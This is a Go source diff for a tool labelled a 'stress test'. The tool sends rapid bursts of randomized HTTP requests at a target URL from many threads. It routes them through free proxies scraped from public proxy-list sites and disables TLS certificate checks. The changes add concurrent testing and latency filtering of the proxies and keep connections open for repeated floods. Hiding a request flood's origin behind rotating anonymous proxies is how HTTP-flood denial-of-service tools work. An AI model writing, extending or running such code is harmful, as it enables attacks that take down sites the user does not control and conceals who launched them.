@@ -27,7 +27,6 @@ var (
 	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
 )
 
-// StressConfig holds command-line configuration
 type StressConfig struct {
 	Target     *url.URL
 	Threads    int
@@ -43,14 +42,22 @@ func init() {
 }
 
 func main() {
-	// Define flags
+	// Flags for proxy scraping and testing
 	proxySourcesFlag := flag.String("proxy-sources", "", "Comma-separated URLs of proxy lists. If empty, will use built-in defaults.")
 	proxyRefreshFlag := flag.Duration("proxy-refresh", 30*time.Minute, "How often to refresh/scrape proxy sources.")
-	proxyTimeoutFlag := flag.Duration("proxy-timeout", 3*time.Second, "Timeout for dialing proxies when testing/using them.")
+	proxyTimeoutFlag := flag.Duration("proxy-timeout", 3*time.Second, "Timeout for dialing proxies when using them.")
 	noFailoverFlag := flag.Bool("no-proxy-failover", false, "If set, do not remove proxies from pool on failure.")
 
+	proxyTestFlag := flag.Bool("proxy-test", true, "Enable testing scraped proxies for quality.")
+	proxyTestTimeoutFlag := flag.Duration("proxy-test-timeout", 3*time.Second, "Timeout for proxy quick test (TCP+CONNECT/GET).")
+	proxyMaxLatencyFlag := flag.Duration("proxy-max-latency", 500*time.Millisecond, "Max acceptable latency for proxy quick test.")
+	proxyTestConcurrencyFlag := flag.Int("proxy-test-concurrency", 50, "Max concurrent proxy tests during refresh.")
+	proxyTestLimitFlag := flag.Int("proxy-test-limit", 200, "Max proxies to test per refresh (0 = all).")
+	proxyPoolSizeFlag := flag.Int("proxy-pool-size", 300, "Desired number of successful proxies to collect before stopping testing.")
+
 	flag.Parse()
-	// Remaining args are positional: URL, THREADS, DURATION_SEC, [CUSTOM_HOST]
+
+	// Positional args: URL, THREADS, DURATION_SEC, [CUSTOM_HOST]
 	args := flag.Args()
 	if len(args) < 3 {
 		fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST] [flags]")
@@ -85,23 +92,33 @@ func main() {
 	var sources []string
 	if *proxySourcesFlag != "" {
 		for _, s := range strings.Split(*proxySourcesFlag, ",") {
-			s = strings.TrimSpace(s)
-			if s != "" {
-				sources = append(sources, s)
+			if t := strings.TrimSpace(s); t != "" {
+				sources = append(sources, t)
 			}
 		}
 	} else {
-		// Built-in defaults: popular free proxy-list sites
 		sources = []string{
 			"https://free-proxy-list.net/",
 			"https://www.sslproxies.org/",
 			"https://www.proxy-list.download/HTTPS",
 			"https://www.us-proxy.org/",
-			// Add more known endpoints if desired...
 		}
 	}
-	proxyMgr := NewProxyManager(sources, *proxyRefreshFlag, *proxyTimeoutFlag, !*noFailoverFlag)
-	proxyMgr.Start() // begin initial fetch + periodic refresh
+
+	proxyMgr := NewProxyManager(
+		sources,
+		*proxyRefreshFlag,
+		*proxyTimeoutFlag,
+		!*noFailoverFlag,
+		*proxyTestFlag,
+		parsed,
+		*proxyTestTimeoutFlag,
+		*proxyMaxLatencyFlag,
+		*proxyTestConcurrencyFlag,
+		*proxyTestLimitFlag,
+		*proxyPoolSizeFlag,
+	)
+	proxyMgr.Start()
 
 	cfg := StressConfig{
 		Target:     parsed,
@@ -113,12 +130,11 @@ func main() {
 		ProxyMgr:   proxyMgr,
 	}
 	fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v, proxies-enabled=%v\n",
-		rawURL, path, threads, cfg.Duration, true)
+		rawURL, path, threads, cfg.Duration, cfg.ProxyMgr != nil)
 	runWorkers(cfg)
 	fmt.Println("Stress test completed.")
 }
 
-// determinePort extracts port from URL or defaults to 80/443
 func determinePort(u *url.URL) int {
 	if p := u.Port(); p != "" {
 		if pi, err := strconv.Atoi(p); err == nil {
@@ -138,15 +154,61 @@ func runWorkers(cfg StressConfig) {
 		wg.Add(1)
 		go func(id int) {
 			defer wg.Done()
+			var conn net.Conn
+			var proxyAddr string
+			tlsCfg := &tls.Config{
+				ServerName:         cfg.Target.Hostname(),
+				InsecureSkipVerify: true,
+			}
+			targetHostPort := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
+
 			ticker := time.NewTicker(60 * time.Millisecond)
 			defer ticker.Stop()
 
 			for {
 				select {
 				case <-stopCh:
+					if conn != nil {
+						conn.Close()
+					}
 					return
 				case <-ticker.C:
-					sendBurst(cfg)
+					// Ensure we have a live connection; if not, pick a proxy and dial
+					if conn == nil {
+						if cfg.ProxyMgr != nil {
+							proxyAddr = cfg.ProxyMgr.GetProxy()
+						} else {
+							proxyAddr = ""
+						}
+						var err error
+						if proxyAddr == "" {
+							conn, err = dialPlainOrTLS(targetHostPort, tlsCfg, cfg.Target.Scheme == "https")
+							if err != nil {
+								fmt.Printf("[worker %d direct dial error] %v\n", id, err)
+								conn = nil
+								continue
+							}
+						} else {
+							conn, err = dialViaHTTPProxy(proxyAddr, targetHostPort, tlsCfg, cfg.Target.Scheme == "https", cfg.ProxyMgr.timeout)
+							if err != nil {
+								cfg.ProxyMgr.ReportFailure(proxyAddr)
+								fmt.Printf("[worker %d proxy %s dial error] %v\n", id, proxyAddr, err)
+								conn = nil
+								continue
+							}
+						}
+					}
+
+					viaProxy := (proxyAddr != "")
+					err := sendBurstOnConn(cfg, conn, viaProxy)
+					if err != nil {
+						fmt.Printf("[worker %d burst error] %v\n", id, err)
+						conn.Close()
+						conn = nil
+						if proxyAddr != "" {
+							cfg.ProxyMgr.ReportFailure(proxyAddr)
+						}
+					}
 				}
 			}
 		}(i)
@@ -154,59 +216,22 @@ func runWorkers(cfg StressConfig) {
 	wg.Wait()
 }
 
-// sendBurst picks a proxy from ProxyManager, dials through it (or direct if none), then sends 180 requests back-to-back
-func sendBurst(cfg StressConfig) {
-	proxyAddr := ""
-	if cfg.ProxyMgr != nil {
-		proxyAddr = cfg.ProxyMgr.GetProxy() // may return "" if pool empty
-	}
-	var conn net.Conn
-	var err error
-	tlsCfg := &tls.Config{
-		ServerName:         cfg.Target.Hostname(),
-		InsecureSkipVerify: true,
-	}
-	targetHostPort := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
-
-	if proxyAddr == "" {
-		// No proxy available → direct dial
-		conn, err = dialPlainOrTLS(targetHostPort, tlsCfg, cfg.Target.Scheme == "https")
-		if err != nil {
-			fmt.Printf("[direct dial error] %v\n", err)
-			return
-		}
-	} else {
-		// Dial via proxy
-		conn, err = dialViaHTTPProxy(proxyAddr, targetHostPort, tlsCfg, cfg.Target.Scheme == "https", cfg.ProxyMgr.timeout)
-		if err != nil {
-			// remove this proxy from pool if configured to failover
-			cfg.ProxyMgr.ReportFailure(proxyAddr)
-			fmt.Printf("[proxy %s dial error] %v\n", proxyAddr, err)
-			return
-		}
-	}
-	defer conn.Close()
-
-	// Send 180 requests in one connection
+func sendBurstOnConn(cfg StressConfig, conn net.Conn, viaProxy bool) error {
 	for i := 0; i < 180; i++ {
 		method := httpMethods[rand.Intn(len(httpMethods))]
-		header, body := buildRequest(cfg, method, proxyAddr != "")
+		header, body := buildRequest(cfg, method, viaProxy)
 		var bufs net.Buffers
 		bufs = append(bufs, []byte(header))
 		if method == "POST" {
 			bufs = append(bufs, body)
 		}
 		if _, err := bufs.WriteTo(conn); err != nil {
-			if proxyAddr != "" {
-				cfg.ProxyMgr.ReportFailure(proxyAddr)
-			}
-			fmt.Printf("[write error] %v\n", err)
-			return
+			return err
 		}
 	}
+	return nil
 }
 
-// dialPlainOrTLS dials directly to target; if isHTTPS, wraps in TLS
 func dialPlainOrTLS(address string, tlsCfg *tls.Config, isHTTPS bool) (net.Conn, error) {
 	if isHTTPS {
 		return tls.Dial("tcp", address, tlsCfg)
@@ -214,15 +239,11 @@ func dialPlainOrTLS(address string, tlsCfg *tls.Config, isHTTPS bool) (net.Conn,
 	return net.DialTimeout("tcp", address, 5*time.Second)
 }
 
-// dialViaHTTPProxy dials the proxy, then does CONNECT if isHTTPS, or plain HTTP otherwise.
-// proxyTimeout is timeout for the initial Dial and CONNECT response read.
 func dialViaHTTPProxy(proxyAddr, targetHostPort string, tlsCfg *tls.Config, isHTTPS bool, proxyTimeout time.Duration) (net.Conn, error) {
-	// Dial to proxy
 	conn, err := net.DialTimeout("tcp", proxyAddr, proxyTimeout)
 	if err != nil {
 		return nil, err
 	}
-	// For HTTPS: send CONNECT
 	if isHTTPS {
 		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: keep-alive\r\n\r\n",
 			targetHostPort, targetHostPort)
@@ -230,7 +251,6 @@ func dialViaHTTPProxy(proxyAddr, targetHostPort string, tlsCfg *tls.Config, isHT
 			conn.Close()
 			return nil, err
 		}
-		// Read proxy response until blank line
 		buf := make([]byte, 4096)
 		conn.SetReadDeadline(time.Now().Add(proxyTimeout))
 		n, err := conn.Read(buf)
@@ -244,7 +264,6 @@ func dialViaHTTPProxy(proxyAddr, targetHostPort string, tlsCfg *tls.Config, isHT
 			firstLine := strings.SplitN(resp, "\r\n", 2)[0]
 			return nil, fmt.Errorf("proxy CONNECT failed: %s", firstLine)
 		}
-		// Wrap in TLS
 		tlsConn := tls.Client(conn, tlsCfg)
 		if err := tlsConn.Handshake(); err != nil {
 			tlsConn.Close()
@@ -252,26 +271,20 @@ func dialViaHTTPProxy(proxyAddr, targetHostPort string, tlsCfg *tls.Config, isHT
 		}
 		return tlsConn, nil
 	}
-	// For plain HTTP: just return conn; request lines will include full URL
 	return conn, nil
 }
 
-// buildRequest constructs request headers; if viaProxy & HTTP, request line uses full URL
 func buildRequest(cfg StressConfig, method string, viaProxy bool) ([]byte, []byte) {
 	var buf bytes.Buffer
 	hostHdr := cfg.Target.Hostname()
 	if cfg.CustomHost != "" {
 		hostHdr = cfg.CustomHost
 	}
-	// Request line
 	if viaProxy && cfg.Target.Scheme == "http" {
-		// full URL in request line
-		// cfg.Target.Host may include port if non-default
 		buf.WriteString(fmt.Sprintf("%s %s://%s%s HTTP/1.1\r\n", method, cfg.Target.Scheme, cfg.Target.Host, cfg.Path))
 	} else {
 		buf.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, cfg.Path))
 	}
-	// Host header: include port if non-standard
 	buf.WriteString("Host: " + hostHdr)
 	if cfg.Port != 80 && cfg.Port != 443 {
 		buf.WriteString(":" + strconv.Itoa(cfg.Port))
@@ -285,7 +298,6 @@ func buildRequest(cfg StressConfig, method string, viaProxy bool) ([]byte, []byt
 		body = createBody(ct)
 		buf.WriteString("Content-Type: " + ct + "\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n")
 	}
-	// Referer and Connection
 	buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
 	out := make([]byte, buf.Len())
 	copy(out, buf.Bytes())
@@ -359,49 +371,69 @@ type ProxyManager struct {
 	refreshInterval time.Duration
 	timeout         time.Duration
 	failover        bool
+	testEnabled     bool
+	testTarget      *url.URL
+	testTimeout     time.Duration
+	maxTestLatency  time.Duration
+	testConcurrency int
+	testLimit       int
+	desiredPoolSize int
 
-	mu      sync.RWMutex
-	proxies []string
-	quitCh  chan struct{}
-	regexIP *regexp.Regexp
+	mu            sync.RWMutex
+	proxies       []string
+	quitCh        chan struct{}
+	regexIP       *regexp.Regexp
+	testedSuccess map[string]struct{}
+	testedFailure map[string]struct{}
+	testedMutex   sync.Mutex
 }
 
-// NewProxyManager: sources is slice of URLs to scrape; refreshInterval; dial timeout; failover=true means drop bad proxies
-func NewProxyManager(sources []string, refreshInterval, timeout time.Duration, failover bool) *ProxyManager {
-	// Simple regex to find IP:PORT in HTML or text
+func NewProxyManager(
+	sources []string,
+	refreshInterval, timeout time.Duration,
+	failover bool,
+	testEnabled bool,
+	testTarget *url.URL,
+	testTimeout, maxTestLatency time.Duration,
+	testConcurrency, testLimit, desiredPoolSize int,
+) *ProxyManager {
 	reg := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b`)
-	pm := &ProxyManager{
+	return &ProxyManager{
 		sources:         sources,
 		refreshInterval: refreshInterval,
 		timeout:         timeout,
 		failover:        failover,
+		testEnabled:     testEnabled,
+		testTarget:      testTarget,
+		testTimeout:     testTimeout,
+		maxTestLatency:  maxTestLatency,
+		testConcurrency: testConcurrency,
+		testLimit:       testLimit,
+		desiredPoolSize: desiredPoolSize,
 		proxies:         make([]string, 0),
 		quitCh:          make(chan struct{}),
 		regexIP:         reg,
+		testedSuccess:   make(map[string]struct{}),
+		testedFailure:   make(map[string]struct{}),
 	}
-	return pm
 }
 
-// Start initial fetch and periodic refresh
 func (pm *ProxyManager) Start() {
-	// Initial fetch immediately
 	pm.fetchAllSources()
-	// Periodic
-	pmTicker := time.NewTicker(pm.refreshInterval)
+	ticker := time.NewTicker(pm.refreshInterval)
 	go func() {
 		for {
 			select {
-			case <-pmTicker.C:
+			case <-ticker.C:
 				pm.fetchAllSources()
 			case <-pm.quitCh:
-				pmTicker.Stop()
+				ticker.Stop()
 				return
 			}
 		}
 	}()
 }
 
-// Stop the periodic fetch (if needed)
 func (pm *ProxyManager) Stop() {
 	close(pm.quitCh)
 }
@@ -416,7 +448,6 @@ func (pm *ProxyManager) GetProxy() string {
 	return pm.proxies[rand.Intn(len(pm.proxies))]
 }
 
-// ReportFailure drops a proxy if failover is enabled
 func (pm *ProxyManager) ReportFailure(proxy string) {
 	if !pm.failover {
 		return
@@ -429,24 +460,50 @@ func (pm *ProxyManager) ReportFailure(proxy string) {
 			break
 		}
 	}
+	// Also record failure so we don't retest immediately
+	pm.testedMutex.Lock()
+	pm.testedFailure[proxy] = struct{}{}
+	pm.testedMutex.Unlock()
 }
 
-// fetchAllSources scrapes each source URL and merges into pool
 func (pm *ProxyManager) fetchAllSources() {
 	for _, src := range pm.sources {
-		proxies, err := pm.scrapeSource(src)
+		rawList, err := pm.scrapeSource(src)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "[proxy scrape error] %s: %v\n", src, err)
 			continue
 		}
-		pm.mergeProxies(proxies)
+		if pm.testEnabled {
+			good := pm.filterNewAndTest(rawList)
+			pm.mergeProxies(good)
+		} else {
+			pm.mergeProxies(rawList)
+		}
 	}
 }
 
-// mergeProxies adds new proxies not already in pool
 func (pm *ProxyManager) mergeProxies(newList []string) {
 	pm.mu.Lock()
 	defer pm.mu.Unlock()
+	// If we've already reached desiredPoolSize successes, ensure proxies list equals testedSuccess keys
+	pm.testedMutex.Lock()
+	successCount := len(pm.testedSuccess)
+	pm.testedMutex.Unlock()
+	if successCount >= pm.desiredPoolSize {
+		// rebuild proxies from testedSuccess
+		var ps []string
+		pm.testedMutex.Lock()
+		for p := range pm.testedSuccess {
+			ps = append(ps, p)
+		}
+		pm.testedMutex.Unlock()
+		rand.Shuffle(len(ps), func(i, j int) {
+			ps[i], ps[j] = ps[j], ps[i]
+		})
+		pm.proxies = ps
+		return
+	}
+	// Otherwise, append newList entries
 	existing := make(map[string]struct{}, len(pm.proxies))
 	for _, p := range pm.proxies {
 		existing[p] = struct{}{}
@@ -456,13 +513,11 @@ func (pm *ProxyManager) mergeProxies(newList []string) {
 			pm.proxies = append(pm.proxies, p)
 		}
 	}
-	// Shuffle after merging
 	rand.Shuffle(len(pm.proxies), func(i, j int) {
 		pm.proxies[i], pm.proxies[j] = pm.proxies[j], pm.proxies[i]
 	})
 }
 
-// scrapeSource fetches the URL and returns a slice of "IP:PORT"
 func (pm *ProxyManager) scrapeSource(src string) ([]string, error) {
 	client := http.Client{
 		Timeout: pm.timeout,
@@ -472,7 +527,7 @@ func (pm *ProxyManager) scrapeSource(src string) ([]string, error) {
 		return nil, err
 	}
 	defer resp.Body.Close()
-	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20)) // limit ~2MB
+	bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
 	if err != nil {
 		return nil, err
 	}
@@ -514,7 +569,185 @@ func (pm *ProxyManager) parseWithRegex(data []byte) []string {
 	return res
 }
 
-// validate "IP:PORT": octets 0-255, port 1-65535
+// filterNewAndTest filters raw proxies: skip those already tested (success or failure), then test up to testLimit
+// and stop early once testedSuccess reaches desiredPoolSize.
+func (pm *ProxyManager) filterNewAndTest(rawList []string) []string {
+	// Build caches snapshot
+	pm.testedMutex.Lock()
+	successCache := make(map[string]struct{}, len(pm.testedSuccess))
+	for p := range pm.testedSuccess {
+		successCache[p] = struct{}{}
+	}
+	failureCache := make(map[string]struct{}, len(pm.testedFailure))
+	for p := range pm.testedFailure {
+		failureCache[p] = struct{}{}
+	}
+	currentSuccess := len(pm.testedSuccess)
+	pm.testedMutex.Unlock()
+
+	// If already have enough successes, skip testing new ones
+	if currentSuccess >= pm.desiredPoolSize {
+		return nil
+	}
+
+	// Collect new proxies not in either cache
+	var toTestAll []string
+	for _, p := range rawList {
+		if _, ok := successCache[p]; ok {
+			continue
+		}
+		if _, ok := failureCache[p]; ok {
+			continue
+		}
+		toTestAll = append(toTestAll, p)
+	}
+	if len(toTestAll) == 0 {
+		return nil
+	}
+	// Shuffle and limit how many to test this round
+	rand.Shuffle(len(toTestAll), func(i, j int) {
+		toTestAll[i], toTestAll[j] = toTestAll[j], toTestAll[i]
+	})
+	limit := pm.testLimit
+	if limit <= 0 || limit > len(toTestAll) {
+		limit = len(toTestAll)
+	}
+	toTest := toTestAll[:limit]
+
+	// Channels and sync for testing with early stop
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, pm.testConcurrency)
+	successCh := make(chan string)
+	done := make(chan struct{})
+
+	// A helper to check if we should stop: checks testedSuccess length under lock
+	shouldStop := func() bool {
+		pm.testedMutex.Lock()
+		defer pm.testedMutex.Unlock()
+		return len(pm.testedSuccess) >= pm.desiredPoolSize
+	}
+
+	for _, proxy := range toTest {
+		// Before launching, check if already reached desired
+		if shouldStop() {
+			break
+		}
+		wg.Add(1)
+		go func(p string) {
+			defer wg.Done()
+			// Early exit if done
+			select {
+			case <-done:
+				return
+			default:
+			}
+			sem <- struct{}{}
+			defer func() { <-sem }()
+			// Test quickly
+			if pm.testProxyQuick(p) {
+				// Lock and add to testedSuccess if still below desired
+				pm.testedMutex.Lock()
+				if _, exists := pm.testedSuccess[p]; !exists && len(pm.testedSuccess) < pm.desiredPoolSize {
+					pm.testedSuccess[p] = struct{}{}
+					select {
+					case successCh <- p:
+					case <-done:
+					}
+					// If now reached desired, close done
+					if len(pm.testedSuccess) >= pm.desiredPoolSize {
+						close(done)
+					}
+				}
+				pm.testedMutex.Unlock()
+			} else {
+				pm.testedMutex.Lock()
+				pm.testedFailure[p] = struct{}{}
+				pm.testedMutex.Unlock()
+			}
+		}(proxy)
+	}
+
+	// Wait and close successCh
+	go func() {
+		wg.Wait()
+		close(successCh)
+	}()
+
+	// Collect successes to return
+	var good []string
+	for p := range successCh {
+		good = append(good, p)
+	}
+	return good
+}
+
+// testProxyQuick does a minimal check: TCP dial to proxy, then CONNECT (for HTTPS target) or GET root (for HTTP) with deadlines.
+func (pm *ProxyManager) testProxyQuick(proxyAddr string) bool {
+	// Dial proxy
+	start := time.Now()
+	conn, err := net.DialTimeout("tcp", proxyAddr, pm.timeout)
+	if err != nil {
+		return false
+	}
+	defer conn.Close()
+
+	// Prepare target host:port
+	targetHost := pm.testTarget.Hostname()
+	targetPort := pm.testTarget.Port()
+	if targetPort == "" {
+		if pm.testTarget.Scheme == "https" {
+			targetPort = "443"
+		} else {
+			targetPort = "80"
+		}
+	}
+	hostPort := net.JoinHostPort(targetHost, targetPort)
+
+	deadline := time.Now().Add(pm.testTimeout)
+	conn.SetDeadline(deadline)
+
+	if pm.testTarget.Scheme == "https" {
+		// send CONNECT
+		connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: close\r\n\r\n", hostPort, hostPort)
+		if _, err := conn.Write([]byte(connectReq)); err != nil {
+			return false
+		}
+		// read status line
+		var buf [256]byte
+		n, err := conn.Read(buf[:])
+		if err != nil {
+			return false
+		}
+		line := string(buf[:n])
+		if !strings.HasPrefix(line, "HTTP/1.1 200") && !strings.HasPrefix(line, "HTTP/1.0 200") {
+			return false
+		}
+	} else {
+		// HTTP: send minimal GET
+		urlStr := fmt.Sprintf("http://%s/", pm.testTarget.Host)
+		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", urlStr, pm.testTarget.Host)
+		if _, err := conn.Write([]byte(req)); err != nil {
+			return false
+		}
+		// read status line
+		var buf [256]byte
+		n, err := conn.Read(buf[:])
+		if err != nil {
+			return false
+		}
+		line := string(buf[:n])
+		if !strings.HasPrefix(line, "HTTP/1.1 2") && !strings.HasPrefix(line, "HTTP/1.0 2") &&
+			!strings.HasPrefix(line, "HTTP/1.1 3") && !strings.HasPrefix(line, "HTTP/1.0 3") {
+			return false
+		}
+	}
+	lat := time.Since(start)
+	if lat > pm.maxTestLatency {
+		return false
+	}
+	return true
+}
+
 func validIPPort(s string) bool {
 	parts := strings.Split(s, ":")
 	if len(parts) != 2 {
